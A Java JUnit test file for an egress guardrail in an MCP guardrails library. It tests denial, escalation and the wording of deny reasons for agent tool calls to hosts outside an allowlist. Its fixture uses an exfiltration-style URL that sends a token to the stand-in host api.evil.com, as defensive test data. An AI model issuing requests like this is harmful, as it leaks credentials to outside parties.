/*
 * Copyright 2026 TikyParkinson
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.github.tikyparkinson.mcpguardrails.egress.adapter.in.chain;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import io.github.tikyparkinson.mcpguardrails.core.domain.AgentId;
import io.github.tikyparkinson.mcpguardrails.core.domain.Allow;
import io.github.tikyparkinson.mcpguardrails.core.domain.Deny;
import io.github.tikyparkinson.mcpguardrails.core.domain.Escalate;
import io.github.tikyparkinson.mcpguardrails.core.domain.GuardrailDecision;
import io.github.tikyparkinson.mcpguardrails.core.domain.ToolInvocationContext;
import io.github.tikyparkinson.mcpguardrails.core.domain.ToolName;
import io.github.tikyparkinson.mcpguardrails.egress.application.port.in.CheckEgressDestinationUseCase;
import io.github.tikyparkinson.mcpguardrails.egress.domain.Destination;
import io.github.tikyparkinson.mcpguardrails.egress.domain.DestinationsAllowed;
import io.github.tikyparkinson.mcpguardrails.egress.domain.EgressCheckResult;
import io.github.tikyparkinson.mcpguardrails.egress.domain.EgressViolation;
import io.github.tikyparkinson.mcpguardrails.egress.domain.NotAnEgressTool;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class EgressGuardrailTest {

  private static final Map<String, Object> ARGUMENTS =
      Map.of("url", "https://api.evil.com/x?token=SECRET123");
  private static final ToolInvocationContext CONTEXT =
      new ToolInvocationContext(
          new AgentId("copilot"),
          new ToolName("http_get"),
          Instant.parse("2026-07-26T10:00:00Z"),
          ARGUMENTS,
          Map.of());

  private final CheckEgressDestinationUseCase useCase = mock(CheckEgressDestinationUseCase.class);

  private EgressGuardrail guardrail(ViolationAction action) {
    return new EgressGuardrail(useCase, action);
  }

  private void checkReturns(EgressCheckResult result) {
    when(useCase.check("http_get", ARGUMENTS)).thenReturn(result);
  }

  private static EgressViolation deniedHosts(String... hosts) {
    return new EgressViolation(List.of(hosts).stream().map(Destination::of).toList(), List.of());
  }

  @Test
  void shouldAllowWhenToolIsNotEgressCapable() {
    // given
    checkReturns(new NotAnEgressTool());

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertInstanceOf(Allow.class, decision);
  }

  @Test
  void shouldAllowWhenEveryDestinationIsOnTheAllowlist() {
    // given
    checkReturns(new DestinationsAllowed(List.of(Destination.of("api.github.com"))));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertInstanceOf(Allow.class, decision);
  }

  @Test
  void shouldDenyWhenDestinationIsOutsideTheAllowlist() {
    // given
    checkReturns(deniedHosts("api.evil.com"));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress to a destination outside the allowlist (api.evil.com)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldEscalateWhenConfiguredToDoSo() {
    // given
    checkReturns(deniedHosts("api.evil.com"));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.ESCALATE).evaluate(CONTEXT);

    // then
    assertInstanceOf(Escalate.class, decision);
  }

  @Test
  void shouldNamedTheArgumentWhenDestinationCouldNotBeRead() {
    // given
    checkReturns(new EgressViolation(List.of(), List.of("url")));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress destination could not be determined from argument (url)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldReportBothProblemsWhenTheyHappenTogether() {
    // given
    checkReturns(new EgressViolation(List.of(Destination.of("api.evil.com")), List.of("cc")));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress to a destination outside the allowlist (api.evil.com); "
            + "egress destination could not be determined from argument (cc)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldNeverPutTheRawArgumentInTheReasonWhenDenying() {
    // given: the denied URL carries a token in its query string, and the reason reaches the model
    checkReturns(deniedHosts("api.evil.com"));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertFalse(assertInstanceOf(Deny.class, decision).reason().contains("SECRET123"));
  }

  @Test
  void shouldListEachHostOnceWhenTheSameOneIsReportedTwice() {
    // given: the same destination can appear in two arguments
    checkReturns(deniedHosts("api.evil.com", "api.evil.com"));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress to a destination outside the allowlist (api.evil.com)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldSummarizeTheRestWhenThereAreMoreThanFiveHosts() {
    // given: a mailing list must not produce a reason of thousands of characters
    List<Destination> many = new ArrayList<>();
    for (int index = 0; index < 8; index++) {
      many.add(Destination.of("evil" + index + ".com"));
    }
    checkReturns(new EgressViolation(many, List.of()));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress to a destination outside the allowlist "
            + "(evil0.com, evil1.com, evil2.com, evil3.com, evil4.com and 3 more)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldListAllOfThemWhenThereAreExactlyFiveHosts() {
    // given: the boundary itself must not be summarized
    List<Destination> five = new ArrayList<>();
    for (int index = 0; index < EgressGuardrail.MAX_LISTED; index++) {
      five.add(Destination.of("evil" + index + ".com"));
    }
    checkReturns(new EgressViolation(five, List.of()));

    // when
    GuardrailDecision decision = guardrail(ViolationAction.DENY).evaluate(CONTEXT);

    // then
    assertEquals(
        "egress to a destination outside the allowlist "
            + "(evil0.com, evil1.com, evil2.com, evil3.com, evil4.com)",
        assertInstanceOf(Deny.class, decision).reason());
  }

  @Test
  void shouldRunAfterCredentialLeakWhenOrderedInTheChain() {
    // given / when
    EgressGuardrail g = guardrail(ViolationAction.DENY);

    // then
    assertEquals("egress-control", g.name());
    assertEquals(70, g.order());
  }

  @Test
  void shouldRejectNullUseCaseWhenConstructed() {
    // given / when / then
    assertThrows(NullPointerException.class, () -> new EgressGuardrail(null, ViolationAction.DENY));
  }

  @Test
  void shouldRejectNullActionWhenConstructed() {
    // given / when / then
    assertThrows(NullPointerException.class, () -> new EgressGuardrail(useCase, null));
  }
}
